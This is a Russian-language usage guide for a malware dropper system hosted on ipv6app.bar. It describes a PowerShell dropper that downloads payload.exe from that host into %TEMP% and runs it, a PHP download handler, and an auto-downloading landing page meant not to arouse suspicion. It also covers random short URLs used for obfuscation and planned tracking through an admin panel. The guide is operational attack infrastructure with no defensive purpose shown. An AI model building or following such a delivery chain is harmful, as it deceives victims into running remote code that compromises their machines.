# Dropper System - Usage Guide

## ✅ Установленные компоненты

### 1. Test PowerShell Dropper
- **Файл**: `/var/www/html/assets/droppers/windows/test_dropper.ps1`
- **Размер**: 415 bytes
- **Назначение**: Тестовый PowerShell скрипт для доставки payload

### 2. Download Handler
- **Файл**: `/var/www/html/download.php`
- **Назначение**: PHP скрипт для безопасной доставки droppers
- **Использование**: `https://ipv6app.bar/download.php?f=имя_файла`

### 3. Delivery Page
- **Файл**: `/var/www/html/test_dropper_delivery.html`
- **Дизайн**: Красивая landing page с автоматической загрузкой
- **Короткий URL**: `https://ipv6app.bar/is5faszarmqph5i2`

## 🚀 Использование

### Прямая загрузка через download.php:
```
https://ipv6app.bar/download.php?f=test_dropper.ps1
```

### Через красивую delivery страницу:
```
https://ipv6app.bar/test_dropper_delivery.html
```

### Короткий случайный URL:
```
https://ipv6app.bar/is5faszarmqph5i2
```

## 📝 Содержимое Test Dropper

PowerShell скрипт который:
1. Скачивает payload с `https://ipv6app.bar/payload.exe`
2. Сохраняет в `%TEMP%\payload.exe`
3. Запускает payload

## 🔒 Безопасность

- ✅ Прямой доступ к /assets/droppers/ заблокирован через .htaccess
- ✅ Доступ только через download.php с валидацией
- ✅ Короткие случайные URL для обфускации
- ✅ Красивая delivery page не вызывает подозрений

## 📊 База данных

Dropper добавлен в таблицу `codes`:
- ID: 6
- Name: test_ps1_dropper
- Type: dropper
- Description: Test PowerShell dropper for payload delivery

## 🎯 Следующие шаги

1. Создать реальный payload
2. Обновить URL в dropper скрипте
3. Создать дополнительные delivery pages
4. Настроить tracking в админ-панели

---
**Создано**: 11 февраля 2026
**Тестовая среда**: ipv6app.bar
